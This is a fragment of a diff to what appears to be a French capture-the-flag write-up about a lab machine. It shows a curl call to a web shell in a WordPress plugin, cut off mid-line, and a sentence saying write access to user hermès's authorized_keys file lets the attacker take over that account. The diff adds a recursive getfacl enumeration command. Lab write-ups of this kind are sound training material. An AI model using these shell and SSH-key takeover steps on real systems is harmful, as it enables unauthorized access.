@@ -213,6 +213,9 @@ curl "http://olympe.god/wp-content/plugins/cmp-premium-themes/nxploitedshell/nxp
 ```
 
 Une fois sur la machine. On trouve avec `getfacl` que l’on à un droit d’écriture sur l’authorized_keys de l’utilisateur `hermès`. 
+```
+getfacl -R -s /
+```
 
 Ce dernier nous à laisser un message pour nous indiquer qu’il aimerai que l’on fasse tomber zeus. 
 
